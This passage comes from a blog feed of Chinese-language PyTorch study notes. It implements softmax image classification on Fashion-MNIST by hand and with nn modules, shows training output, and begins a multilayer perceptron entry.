class="hljs-number">0</span>].weight.data<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;w的估计误差：&#x27;</span>, true_w - w.reshape(true_w.shape))<br>b = net[<span class="hljs-number">0</span>].bias.data<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;b的估计误差：&#x27;</span>, true_b - b)<br></code></pre></td></tr></table></figure><pre><code class="hljs">w的估计误差： tensor([0.0002, 0.0010])b的估计误差： tensor([0.0007])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(net)<br></code></pre></td></tr></table></figure><pre><code class="hljs">Sequential(  (0): Linear(in_features=2, out_features=1, bias=True))</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">w_grad = net[<span class="hljs-number">0</span>].weight.grad<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;w的梯度：&#x27;</span>, w_grad)<br>b_grad = net[<span class="hljs-number">0</span>].bias.grad<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;b的梯度：&#x27;</span>, b_grad)<br></code></pre></td></tr></table></figure><pre><code class="hljs">w的梯度： tensor([[0.0019, 0.0058]])b的梯度： tensor([0.0047])</code></pre>]]></content>
    
    
    <categories>
      
      <category>pytorch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pytorch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>softmax image classfication</title>
    <link href="/2023/11/19/ai/softmax%20image%20classification/"/>
    <url>/2023/11/19/ai/softmax%20image%20classification/</url>
    
    <content type="html"><![CDATA[<p><strong>softmax函数能够将未规范化的预测变换为非负数并且总和为1，同时让模型保持可导的性质</strong></p><h3 id="1-手写softmax"><a href="#1-手写softmax" class="headerlink" title="1  手写softmax"></a>1  手写softmax</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">from</span> d2l <span class="hljs-keyword">import</span> torch <span class="hljs-keyword">as</span> d2l<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_dataloader_workers</span>(): <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data_fashion_mnist</span>(<span class="hljs-params">batch_size, resize=<span class="hljs-literal">None</span></span>): <br>    trans = [transforms.ToTensor()]<br>    <span class="hljs-keyword">if</span> resize:<br>        trans.insert(<span class="hljs-number">0</span>, transforms.Resize(resize))<br>    trans = transforms.Compose(trans)<br>    mnist_train = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">True</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    mnist_test = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">False</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> (<br>            data.DataLoader(mnist_train, batch_size, shuffle=<span class="hljs-literal">True</span>, num_workers=get_dataloader_workers()),<br>            data.DataLoader(mnist_test, batch_size, shuffle=<span class="hljs-literal">False</span>, num_workers=get_dataloader_workers())<br>           )<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">num_inputs = <span class="hljs-number">784</span><br>num_outputs = <span class="hljs-number">10</span><br><br>W = torch.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.01</span>, size=(num_inputs, num_outputs), requires_grad=<span class="hljs-literal">True</span>)<br>b = torch.zeros(num_outputs, requires_grad=<span class="hljs-literal">True</span>)<br>W.shape<br></code></pre></td></tr></table></figure><pre><code class="hljs">torch.Size([784, 10])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">softmax</span>(<span class="hljs-params">X</span>):<br>    X_exp = torch.exp(X)<br>    partition = X_exp.<span class="hljs-built_in">sum</span>(<span class="hljs-number">1</span>, keepdim=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> X_exp / partition  <span class="hljs-comment"># 这里应用了广播机制</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">X = torch.normal(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, (<span class="hljs-number">2</span>, <span class="hljs-number">5</span>))<br>X_prob = softmax(X)<br>X_prob, X_prob.<span class="hljs-built_in">sum</span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">(tensor([[0.4592, 0.1162, 0.1164, 0.2214, 0.0868],         [0.3951, 0.0510, 0.1455, 0.3218, 0.0867]]), tensor([1., 1.]))</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">net</span>(<span class="hljs-params">X</span>):<br>    X_ = X.reshape((-<span class="hljs-number">1</span>,W.shape[<span class="hljs-number">0</span>])) <span class="hljs-comment"># batchsize x 1x28x28 -&gt; batchsize x 784</span><br>    <span class="hljs-keyword">return</span> softmax(torch.matmul(X_, W) + b)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">cross_entropy</span>(<span class="hljs-params">y_hat, y</span>):<br>    <span class="hljs-keyword">return</span> - torch.log(y_hat[<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(y_hat)), y])<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 不重要，不用看</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Accumulator</span>:  <br>    <span class="hljs-string">&quot;&quot;&quot;在n个变量上累加&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, n</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, *args</span>):<br>        self.data = [a + <span class="hljs-built_in">float</span>(b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.data, args)]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params">self</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * <span class="hljs-built_in">len</span>(self.data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, idx</span>):<br>        <span class="hljs-keyword">return</span> self.data[idx]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">accuracy</span>(<span class="hljs-params">y_hat, y</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;计算预测正确的数量&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(y_hat.shape) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y_hat.shape[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">1</span>:<br>        y_hat = y_hat.argmax(axis=<span class="hljs-number">1</span>)<br>    cmp = y_hat.<span class="hljs-built_in">type</span>(y.dtype) == y<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(cmp.<span class="hljs-built_in">type</span>(y.dtype).<span class="hljs-built_in">sum</span>())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_accuracy</span>(<span class="hljs-params">net, data_iter</span>):  <br>    <span class="hljs-string">&quot;&quot;&quot;计算在指定数据集上模型的精度&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.<span class="hljs-built_in">eval</span>()  <span class="hljs-comment"># 将模型设置为评估模式</span><br>    metric = Accumulator(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 正确预测数、预测总数</span><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>            metric.add(accuracy(net(X), y), y.numel())<br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">1</span>]<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">batch_size = <span class="hljs-number">256</span><br>train_iter, test_iter = load_data_fashion_mnist(batch_size)<br>evaluate_accuracy(net, test_iter) <span class="hljs-comment"># 未训练，所以predict正确的概率为 1/10</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">0.1337</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_epoch_ch3</span>(<span class="hljs-params">net, train_iter, loss, updater</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;训练模型一个迭代周期（定义见第3章）&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 将模型设置为训练模式</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.train()<br>    <span class="hljs-comment"># 训练损失总和、训练准确度总和、样本数</span><br>    metric = Accumulator(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> train_iter:<br>        <span class="hljs-comment"># 计算梯度并更新参数</span><br>        y_hat = net(X)<br>        l = loss(y_hat, y)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(updater, torch.optim.Optimizer): <span class="hljs-comment"># 这里是自己写的updater，为false</span><br>            <span class="hljs-comment"># 使用PyTorch内置的优化器和损失函数</span><br>            updater.zero_grad()<br>            l.mean().backward()<br>            updater.step()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 使用定制的优化器和损失函数</span><br>            l.<span class="hljs-built_in">sum</span>().backward()<br>            updater(X.shape[<span class="hljs-number">0</span>])<br>        metric.add(<span class="hljs-built_in">float</span>(l.<span class="hljs-built_in">sum</span>()), accuracy(y_hat, y), y.numel())<br>    <span class="hljs-comment"># 返回训练损失和训练精度</span><br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">2</span>], metric[<span class="hljs-number">1</span>] / metric[<span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_ch3</span>(<span class="hljs-params">net, train_iter, test_iter, loss, num_epochs, updater</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;训练模型（定义见第3章）&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>        train_metrics = train_epoch_ch3(net, train_iter, loss, updater)<br>        train_loss, train_acc = train_metrics<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;epoch <span class="hljs-subst">&#123;epoch + <span class="hljs-number">1</span>&#125;</span>, loss <span class="hljs-subst">&#123;train_loss:f&#125;</span>, acc <span class="hljs-subst">&#123;train_acc:f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">lr = <span class="hljs-number">0.1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">updater</span>(<span class="hljs-params">batch_size</span>):<br>    <span class="hljs-keyword">return</span> d2l.sgd([W, b], lr, batch_size)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">num_epochs = <span class="hljs-number">10</span><br>train_ch3(net, train_iter, test_iter, cross_entropy, num_epochs, updater)<br></code></pre></td></tr></table></figure><pre><code class="hljs">epoch 1, loss 0.786198, acc 0.749617epoch 2, loss 0.570151, acc 0.812767epoch 3, loss 0.526287, acc 0.825667epoch 4, loss 0.500650, acc 0.832700epoch 5, loss 0.485373, acc 0.837500epoch 6, loss 0.473836, acc 0.839833epoch 7, loss 0.465260, acc 0.843550epoch 8, loss 0.458585, acc 0.845067epoch 9, loss 0.451611, acc 0.846433epoch 10, loss 0.447118, acc 0.848250</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">evaluate_accuracy(net, test_iter)<br><span class="hljs-comment"># 和前面的1/10相比</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">0.8294</code></pre><h3 id="2-pytorch"><a href="#2-pytorch" class="headerlink" title="2  pytorch"></a>2  pytorch</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">batch_size = <span class="hljs-number">256</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_dataloader_workers</span>():  <span class="hljs-comment">#@save</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data_fashion_mnist</span>(<span class="hljs-params">batch_size, resize=<span class="hljs-literal">None</span></span>): <br>    trans = [transforms.ToTensor()]<br>    <span class="hljs-keyword">if</span> resize:<br>        trans.insert(<span class="hljs-number">0</span>, transforms.Resize(resize))<br>    trans = transforms.Compose(trans)<br>    mnist_train = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">True</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    mnist_test = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">False</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> (<br>            data.DataLoader(mnist_train, batch_size, shuffle=<span class="hljs-literal">True</span>, num_workers=get_dataloader_workers()),<br>            data.DataLoader(mnist_test, batch_size, shuffle=<span class="hljs-literal">False</span>, num_workers=get_dataloader_workers())<br>           )<br>train_iter, test_iter = load_data_fashion_mnist(<span class="hljs-number">256</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">net = nn.Sequential(nn.Flatten(), nn.Linear(<span class="hljs-number">784</span>,<span class="hljs-number">10</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_weights</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(m) == nn.Linear:<br>        nn.init.normal_(m.weight, std=<span class="hljs-number">0.01</span>)<br>net.apply(init_weights)<br>net<br></code></pre></td></tr></table></figure><pre><code class="hljs">Sequential(  (0): Flatten(start_dim=1, end_dim=-1)  (1): Linear(in_features=784, out_features=10, bias=True))</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">loss = nn.CrossEntropyLoss(reduction=<span class="hljs-string">&#x27;none&#x27;</span>)<br>trainer = torch.optim.SGD(net.parameters(), lr=<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">num_epochs = <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 不重要，不用看</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Accumulator</span>:  <br>    <span class="hljs-string">&quot;&quot;&quot;在n个变量上累加&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, n</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, *args</span>):<br>        self.data = [a + <span class="hljs-built_in">float</span>(b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.data, args)]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params">self</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * <span class="hljs-built_in">len</span>(self.data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, idx</span>):<br>        <span class="hljs-keyword">return</span> self.data[idx]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">accuracy</span>(<span class="hljs-params">y_hat, y</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;计算预测正确的数量&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(y_hat.shape) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y_hat.shape[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">1</span>:<br>        y_hat = y_hat.argmax(axis=<span class="hljs-number">1</span>)<br>    cmp = y_hat.<span class="hljs-built_in">type</span>(y.dtype) == y<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(cmp.<span class="hljs-built_in">type</span>(y.dtype).<span class="hljs-built_in">sum</span>())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_accuracy</span>(<span class="hljs-params">net, data_iter</span>):  <br>    <span class="hljs-string">&quot;&quot;&quot;计算在指定数据集上模型的精度&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.<span class="hljs-built_in">eval</span>()  <span class="hljs-comment"># 将模型设置为评估模式</span><br>    metric = Accumulator(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 正确预测数、预测总数</span><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>            metric.add(accuracy(net(X), y), y.numel())<br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_epoch_ch3</span>(<span class="hljs-params">net, train_iter, loss, updater</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;训练模型一个迭代周期（定义见第3章）&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 将模型设置为训练模式</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.train()<br>    <span class="hljs-comment"># 训练损失总和、训练准确度总和、样本数</span><br>    metric = Accumulator(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> train_iter:<br>        <span class="hljs-comment"># 计算梯度并更新参数</span><br>        y_hat = net(X)<br>        l = loss(y_hat, y)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(updater, torch.optim.Optimizer):  <span class="hljs-comment"># 这次就是true了</span><br>            <span class="hljs-comment"># 使用PyTorch内置的优化器和损失函数</span><br>            updater.zero_grad()<br>            l.mean().backward()<br>            updater.step()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 使用定制的优化器和损失函数</span><br>            l.<span class="hljs-built_in">sum</span>().backward()<br>            updater(X.shape[<span class="hljs-number">0</span>])<br>        metric.add(<span class="hljs-built_in">float</span>(l.<span class="hljs-built_in">sum</span>()), accuracy(y_hat, y), y.numel())<br>    <span class="hljs-comment"># 返回训练损失和训练精度</span><br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">2</span>], metric[<span class="hljs-number">1</span>] / metric[<span class="hljs-number">2</span>]<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_ch3</span>(<span class="hljs-params">net, train_iter, test_iter, loss, num_epochs, updater</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;训练模型（定义见第3章）&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>        train_metrics = train_epoch_ch3(net, train_iter, loss, updater)<br>        train_loss, train_acc = train_metrics<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;epoch <span class="hljs-subst">&#123;epoch + <span class="hljs-number">1</span>&#125;</span>, loss <span class="hljs-subst">&#123;train_loss:f&#125;</span>, acc <span class="hljs-subst">&#123;train_acc:f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">train_ch3(net, train_iter, test_iter, loss, num_epochs, trainer)<br></code></pre></td></tr></table></figure><pre><code class="hljs">epoch 1, loss 0.786900, acc 0.750100epoch 2, loss 0.569765, acc 0.813767epoch 3, loss 0.523460, acc 0.826400epoch 4, loss 0.501842, acc 0.830967epoch 5, loss 0.484808, acc 0.836317epoch 6, loss 0.473122, acc 0.840633epoch 7, loss 0.465168, acc 0.842500epoch 8, loss 0.457948, acc 0.844433epoch 9, loss 0.452464, acc 0.847283epoch 10, loss 0.447432, acc 0.847467</code></pre>]]></content>
    
    
    <categories>
      
      <category>pytorch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pytorch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>multilayer perceptrons</title>
    <link href="/2023/11/19/ai/multilayer%20perceptrons/"/>
    <url>/2023/11/19/ai/multilayer%20perceptrons/</url>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">net = nn.Sequential(nn.Flatten(), <br>                    nn.Linear(<span class="hljs-number">784</span>,<span class="hljs-number">256</span>), <br>                    nn.ReLU(),<br>                    nn.Linear(<span class="hljs-number">256</span>,<span class="hljs-number">10</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">batch_size = <span class="hljs-number">256</span><br>lr = <span class="hljs-number">0.1</span><br>num_epochs = <span class="hljs-number">10</span><br>loss = nn.CrossEntropyLoss(reduction=<span class="hljs-string">&#x27;none&#x27;</span>)<br>trainer = torch.optim.SGD(net.parameters(), lr=lr)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_dataloader_workers</span>():  <span class="hljs-comment">#@save</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title 